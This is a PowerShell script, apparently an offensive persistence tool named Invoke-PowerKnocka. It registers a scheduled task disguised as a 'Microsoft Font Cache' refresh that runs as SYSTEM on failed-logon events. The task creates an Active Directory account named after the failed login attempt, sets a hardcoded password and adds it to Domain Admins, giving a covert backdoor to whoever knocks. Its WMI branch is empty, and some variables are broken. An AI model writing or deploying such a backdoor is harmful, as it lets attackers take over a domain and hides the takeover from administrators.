function Invoke-PowerKnocka {
    
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory)]
        [string]$Method,

        [Parameter(Mandatory=$false)]
        [string]$TaskName = "Microsoft Font Cache",

        [Parameter(Mandatory=$false)]
        [string]$TaskDesription = "Default task to refresh the font cache service",

        [Parameter(Mandatory=$false)]
        [string]$TaskPath = "\Font Cache\",

        [Parameter(Mandatory=$false)]
        [string]$Password = "Password1!qazwsx"
    )

    $ExploitString = "Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
                    $n = $e.ReplacementStrings[5] `
                    New-ADUser -Enabled $true -SamAccountName $n -name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force) `
                    Add-ADGroupMember -Identity 'Domain Admins' -Members $n"

    if ($Method -eq "Task") {
        $Class = Get-cimclass MSFT_TaskEventTrigger root/Microsoft/Windows/TaskScheduler
        $Trigger = $Class | New-CimInstance -ClientOnly
        $Trigger.Enabled = $true
        $Trigger.Subscription = '<QueryList><Query Id="0" Path="Security"><Select Path="Security">*[System[Provider[@Name=''Microsoft-Windows-Security-Auditing''] and EventID=4625]]</Select></Query></QueryList>'
        $Principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount
        $Settings = New-ScheduledTaskSettingsSet
        $ActionParameters = @{
            Execute  = 'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe'
            Argument = $ExploitString
        }
        $Action = New-ScheduledTaskAction @ActionParameters
        $RegSchTaskParameters = @{
            TaskName    = $Name
            Description = $TaskDescription
            TaskPath    = $TaskPath
            Action      = $Action
            Principal   = $Principal
            Settings    = $Settings
            Trigger     = $Trigger
        }        
        Register-ScheduledTask @RegSchTaskParameters
    } 
    elseif ($Method -eq "WMI") {

    } 
    else {
        Write-Host "[Error] Invalid Method, exiting" -ForegroundColor Red
        exit
    }
}